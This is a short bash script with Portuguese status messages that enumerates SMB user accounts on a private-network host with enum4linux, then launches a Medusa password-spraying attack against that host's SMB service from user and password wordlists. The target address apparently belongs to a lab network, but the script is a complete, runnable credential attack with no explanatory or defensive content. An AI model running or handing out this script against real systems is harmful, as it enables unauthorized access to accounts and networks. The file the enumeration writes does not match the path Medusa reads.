#!/bin/bash
echo "[*] Enumerando usuários SMB..."
enum4linux -U 192.168.56.101 > smb_users.txt

echo "[*] Iniciando password spraying com Medusa..."
medusa -h 192.168.56.101 -U wordlists/smb_users.txt -P wordlists/smb_passwords.txt -M smbnt
